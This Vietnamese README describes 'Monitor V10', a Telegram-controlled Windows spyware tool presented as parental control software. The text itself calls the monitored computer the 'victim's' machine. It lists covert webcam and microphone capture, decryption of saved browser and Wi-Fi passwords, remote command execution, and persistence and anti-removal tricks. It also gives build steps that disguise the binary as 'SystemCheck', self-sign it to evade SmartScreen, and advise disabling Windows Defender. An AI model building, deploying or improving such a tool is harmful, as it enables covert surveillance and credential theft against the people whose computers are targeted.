-----

# 🛡️ MONITOR V10 - PARENTAL CONTROL TOOL - PERSONAL SYSTEM ADMINISTRATION

> **Developer:** TsByin  
> **Version:** 2.0 (Refactored & Optimized)

Công cụ quản lý và giám sát máy tính từ xa qua Telegram Bot. Phiên bản V10 tích hợp các tính năng bảo mật nâng cao, chặn ứng dụng/web thông minh và cơ chế tự bảo vệ.

> **⚠️ LƯU Ý PHÁP LÝ:** Công cụ này được thiết kế cho mục đích **Quản lý con cái ** hoặc **Quản trị hệ thống cá nhân**. Việc sử dụng công cụ này để theo dõi máy tính của người khác mà không có sự đồng ý là vi phạm pháp luật. Tác giả không chịu trách nhiệm về bất kỳ hành vi sử dụng sai mục đích nào.

-----

## ✨ TÍNH NĂNG CHÍNH

### 1\. 📡 Giám Sát & Theo Dõi (Real-time)

  * **📸 Webcam:** Chụp ảnh bí mật từ camera trước.
  * **🖼 Chụp Màn Hình:** Chụp ảnh màn hình (nén thông minh gửi nhanh).
  * **🎥 Quay Màn Hình:** Quay video hoạt động trong 10 giây.
  * **🎤 Ghi Âm:** Nghe lén môi trường xung quanh (10 giây).
  * **⚙️ Quản lý Tiến trình:** Xem và Tắt (Kill) các ứng dụng đang chạy.

### 2\. 🚫 Kiểm Soát & Chặn (Control)

  * **Chặn Web:** Chặn truy cập web (Facebook, YouTube...) bằng file Hosts + Flush DNS.
  * **Chặn App:** Tự động tắt ứng dụng/game trong danh sách đen.
  * **Khóa Input:** Khóa bàn phím và chuột từ xa.
  * **Khóa Task Manager:** Ngăn chặn mở Trình quản lý tác vụ.
  * **Nguồn:** Tắt máy, Khởi động lại từ xa.

### 3\. 📂 Dữ Liệu & Tệp Tin (Grabber & Explorer)

  * **Lấy Mật Khẩu:** Giải mã mật khẩu lưu trên trình duyệt (Chrome, Edge, Cốc Cốc...).
  * **Lịch Sử Web:** Xem lịch sử truy cập của từng trình duyệt.
  * **Wi-Fi:** Xem danh sách và mật khẩu Wifi đã lưu.
  * **File Explorer:** Duyệt, Tải về và Upload file lên máy tính nạn nhân.

### 4\. 🛡️ Cơ Chế Tự Vệ (Stealth & Defense)

  * **Persistence:** Tự động khởi động cùng Windows (Registry).
  * **Anti-Delete:** Chống xóa thư mục bot bằng quyền NTFS (Access Denied).
  * **Self-Defense:** Tự động đóng cửa sổ thư mục nếu bị người dùng tìm thấy.
  * **Auto-Reconnect:** Tự động kết nối lại khi mất mạng.

-----

## 🛠️ YÊU CẦU HỆ THỐNG

  * **OS:** Windows 10/11 (64-bit).
  * **Python:** 3.8 trở lên.
  * **Quyền:** Administrator (Bắt buộc để chặn Web và ghi Registry).

-----

## 🚀 CÀI ĐẶT MÔI TRƯỜNG (Dev)

Chạy lần lượt các lệnh sau trong CMD để cài đặt thư viện:

```bash
# 1. Cài đặt công cụ hỗ trợ binary
pip install pipwin

# 2. Cài đặt thư viện âm thanh (Thường hay lỗi nếu cài thường)
pipwin install pyaudio

# 3. Cài đặt các thư viện còn lại từ file requirements
pip install -r requirements.txt
```

-----

## ⚙️ CẤU HÌNH (Config)

Mở file `V8.py` và sửa trực tiếp 2 dòng đầu:

```python
API_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN" 
ADMIN_ID = 123456789  # ID Telegram của bạn
```

-----

## 📦 ĐÓNG GÓI & TRIỂN KHAI (Build EXE)

### Bước 1: Build file EXE

Sử dụng PyInstaller để đóng gói thành 1 file duy nhất, chạy ngầm:

```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V8.py
```

*File kết quả sẽ nằm trong thư mục `dist/SystemCheck.exe`.*

### Bước 2: Ký Chữ Ký Số (Code Signing)

Chạy **PowerShell (Admin)** để ký file giúp tránh màn hình xanh SmartScreen.

```powershell
# 1. Tạo chứng chỉ (Nếu chưa có)
$cert = New-SelfSignedCertificate -DnsName "Cert -CertStoreLocation "Cert:\CurrentUser\My" -Type CodeSigningCert
# Trust chứng chỉ
$rootStore = New-Object System.Security.Cryptography.X509Certificates.X509Store([System.Security.Cryptography.X509Certificates.StoreName]::Root, "CurrentUser")
$rootStore.Open("ReadWrite"); $rootStore.Add($cert); $rootStore.Close()

# 2. Ký vào file EXE
Set-AuthenticodeSignature -Certificate $cert -FilePath "dist\SystemCheck.exe"

# 3. Xuất file chứng chỉ (Để cài sang máy khác)
Export-Certificate -Cert $cert -FilePath "dist\Cert.cer"
```

-----

## 📖 HƯỚNG DẪN SỬ DỤNG (Telegram)

### Các lệnh Chat:

| Lệnh | Mô tả |
| :--- | :--- |
| `/start` | Mở Menu điều khiển chính (Nút bấm). |
| `/help` | Xem hướng dẫn chi tiết. |
| `/block app <tên.exe>` | Thêm ứng dụng vào danh sách chặn. |
| `/block site <domain>` | Thêm web vào danh sách chặn. |
| `/unblock ...` | Xóa khỏi danh sách chặn. |
| `/msg <nội dung>` | Hiện thông báo nổi trên màn hình máy tính. |
| `/say <nội dung>` | Máy tính phát ra giọng nói (Tiếng Anh). |
| `/cmd <lệnh>` | Chạy lệnh CMD ngầm (VD: `/cmd ipconfig`). |

### Chặn Settings & Control Panel:

Để chặn người dùng gỡ cài đặt hoặc chỉnh hệ thống, hãy dùng lệnh:

1.  `/block app SystemSettings.exe` (Chặn Cài đặt)
2.  `/block app control.exe` (Chặn Control Panel)
3.  Bấm nút **🚫 Chặn App/Web** để kích hoạt.

-----

## ❓ XỬ LÝ SỰ CỐ (Troubleshooting)

**1. Bot không online?**

  * Kiểm tra mạng máy tính.
  * Kiểm tra Token/ID trong code.
  * Nếu chạy bản EXE, đảm bảo đã tắt Windows Defender hoặc thêm thư mục vào Exclusion.

**2. Không chặn được Web?**

  * Bot phải được chạy với quyền **Administrator**.
  * Một số trình duyệt dùng *Secure DNS (DoH)*, hãy vào cài đặt trình duyệt tắt nó đi nếu cần thiết.

**3. Không thể xóa/update file EXE?**

  * Do cơ chế bảo vệ thư mục đang bật.
  * **Cách sửa:** Dùng Bot gửi lệnh CMD:
    `/cmd icacls "%APPDATA%\Microsoft\Windows\SystemMonitor" /reset /T`
    Sau đó dùng `/cmd taskkill /f /im SystemCheck.exe` để tắt bot rồi mới xóa được.